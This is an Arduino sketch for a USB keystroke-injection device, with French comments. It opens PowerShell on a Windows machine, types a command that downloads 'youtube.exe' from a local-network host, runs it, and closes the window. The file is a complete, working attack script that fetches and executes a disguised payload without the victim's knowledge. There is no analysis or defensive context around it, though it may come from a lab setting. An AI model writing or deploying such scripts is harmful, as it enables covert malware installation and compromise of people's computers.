#include "Keyboard.h"

#define SHORT_DELAY 300
#define LONG_DELAY 1000
#define VERY_LONG_DELAY 3000

void setup() {
  Keyboard.begin();
  delay(1000);

  // Win + R
  Keyboard.press(KEY_LEFT_GUI);
  delay(SHORT_DELAY);
  Keyboard.press('r');
  delay(SHORT_DELAY);
  Keyboard.releaseAll();
  delay(LONG_DELAY);

  // powershell
  Keyboard.print("powershell");
  delay(SHORT_DELAY);
  Keyboard.press(KEY_RETURN);
  delay(SHORT_DELAY);
  Keyboard.releaseAll();
  delay(VERY_LONG_DELAY);

  // Téléchargement sans guillemets
  Keyboard.print("Invoke-WebRequest -Uri http://10.33.1.176:8000/youtube.exe ");
  delay(SHORT_DELAY);
  Keyboard.print("-OutFile $env:USERPROFILE\\Downloads\\youtube.exe");
  delay(SHORT_DELAY);
  Keyboard.press(KEY_RETURN);
  delay(SHORT_DELAY);
  Keyboard.releaseAll();
  delay(VERY_LONG_DELAY);

  // Exécution sans guillemets
  Keyboard.print("Start-Process $env:USERPROFILE\\Downloads\\youtube.exe");
  delay(SHORT_DELAY);
  Keyboard.press(KEY_RETURN);
  delay(SHORT_DELAY);
  Keyboard.releaseAll();

  // Quitter PowerShell
  Keyboard.print("exit");
  delay(SHORT_DELAY);
  Keyboard.press(KEY_RETURN);
  delay(SHORT_DELAY);
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {
  // Ne rien faire
}
